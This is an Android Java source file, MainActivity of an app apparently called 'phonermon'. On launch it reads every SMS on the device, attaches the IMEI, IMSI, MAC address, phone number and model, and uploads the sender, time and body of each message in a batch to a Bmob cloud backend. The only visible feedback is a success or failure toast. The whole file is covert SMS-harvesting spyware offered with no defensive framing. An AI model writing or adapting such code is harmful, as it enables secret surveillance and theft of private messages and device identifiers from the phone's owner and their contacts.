package com.my.phonermon;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import cn.bmob.v3.BmobObject;
import cn.bmob.v3.listener.SaveListener;

import com.my.phonermon.model.db.SMS;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {
	
	public static final String uri_sms_sent = "content://sms/sent";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		List<SMS> list = DBUtils.query(Uri.parse("content://sms"), null, null, null, null, SMS.class);
		
		List<BmobObject> datas = new ArrayList<BmobObject>();
		
		for(SMS sms : list){
			com.my.phonermon.model.network.SMS networkSms = new com.my.phonermon.model.network.SMS();
			
			networkSms.setBrand(android.os.Build.BRAND);
			networkSms.setImei(PackageUtils.getIMEI());
			networkSms.setImsi(PackageUtils.getIMSI());
			networkSms.setMac(PackageUtils.getMAC());
			networkSms.setModel(android.os.Build.MODEL);
			networkSms.setReceiver(PackageUtils.getPhoneNumber());
			networkSms.setSender(sms.getAddress());
			networkSms.setSenderTime(new Date(sms.getDate()));
			networkSms.setSmsMsg(sms.getBody());
			networkSms.setStatus(com.my.phonermon.model.network.SMS.Receive);
			datas.add(networkSms);
		}
		
		com.my.phonermon.model.network.SMS.insertBatch(datas, new SaveListener() {
			
			@Override
			public void onSuccess() {
				ToastUtils.showToast("success");
			}
			
			@Override
			public void onFailure(int arg0, String arg1) {
				ToastUtils.showToast("failure");
			}
		});
	}

}
